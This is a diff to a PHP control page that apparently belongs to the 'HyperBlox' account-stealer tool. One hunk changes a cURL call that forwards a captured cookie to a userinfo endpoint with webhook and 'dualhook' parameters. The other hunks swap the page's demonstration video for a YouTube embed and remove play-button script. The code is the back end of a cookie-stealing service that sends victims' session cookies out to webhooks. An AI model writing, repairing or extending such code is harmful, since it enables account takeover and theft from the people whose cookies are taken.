@@ -83,7 +83,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             file_put_contents($dailyLogsFile, json_encode($dailyLogsData));
 
             // Call userinfo.php with cURL and proper timeout to send webhook
-            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}";
+            // Pass both 'dh' and 'dualhook' parameters to ensure dualhook is received
+            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}&dualhook={dualhook}";
             
             $ch = curl_init($userInfoUrl);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -1214,13 +1215,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     </div>
                     <h3>How to Use</h3>
                     <p>Watch our exclusive demonstration to see how this tool works.</p>
-                    <div class="video-container">
-                        <video width="100%" height="auto" controls poster="https://via.placeholder.com/800x450/0f172a/94a3b8?text=HyperBlox+Demonstration">
-                            <source src="https://hyperblox.eu/Account-Stealer/acountstealer.mp4" type="video/mp4">
-                        </video>
-                        <button class="play-button">
-                            <i class="fas fa-play"></i>
-                        </button>
+                    <div class="video-container" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000;">
+                        <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
+                                src="https://www.youtube.com/embed/vSrc3DKroX0?rel=0" 
+                                frameborder="0" 
+                                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                                allowfullscreen>
+                        </iframe>
                     </div>
 
                     <div style="margin-top: 24px; display: flex; gap: 16px;">
@@ -1500,29 +1501,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             });
         }
 
-        const playButton = document.querySelector('.play-button');
-        const video = document.querySelector('video');
-        if (playButton && video) {
-            playButton.addEventListener('click', function() {
-                video.play();
-                this.style.opacity = '0';
-                this.style.pointerEvents = 'none';
-            });
-
-            video.addEventListener('play', function() {
-                if (playButton) {
-                    playButton.style.opacity = '0';
-                    playButton.style.pointerEvents = 'none';
-                }
-            });
-
-            video.addEventListener('pause', function() {
-                if (playButton) {
-                    playButton.style.opacity = '1';
-                    playButton.style.pointerEvents = 'auto';
-                }
-            });
-        }
+        // Video controls are handled by YouTube embed
 
         const faqItems = document.querySelectorAll('.faq-item');
         if (faqItems.length > 0) {
